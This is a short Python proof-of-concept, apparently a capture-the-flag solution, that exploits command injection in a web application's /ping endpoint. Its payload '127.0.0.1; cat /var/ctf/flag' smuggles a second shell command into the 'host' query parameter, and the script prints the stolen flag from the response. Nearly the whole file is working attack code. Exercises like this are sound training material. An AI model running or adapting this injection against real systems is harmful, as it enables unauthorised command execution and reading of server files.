#!/usr/bin/env python3
import json
import os
import sys
from typing import Tuple

import requests


def build_target() -> Tuple[str, int]:
    # 명령행 인자를 먼저 확인, 없으면 환경 변수, 없으면 기본값
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = os.environ.get("TARGET_HOST", "127.0.0.1")
        port = int(os.environ.get("TARGET_PORT", "5000"))
    return host, port


def run_exploit() -> None:
    host, port = build_target()
    url = f"http://{host}:{port}/ping"
    payload = "127.0.0.1; cat /var/ctf/flag"
    response = requests.get(url, params={"host": payload}, timeout=5)
    response.raise_for_status()

    data = response.json()
    flag = data["output"].splitlines()[-1].strip()
    print(flag)


if __name__ == "__main__":
    try:
        run_exploit()
    except Exception as exc:  # pragma: no cover - best-effort PoC
        print(f"[!] exploit failed: {exc}", file=sys.stderr)
        sys.exit(1)

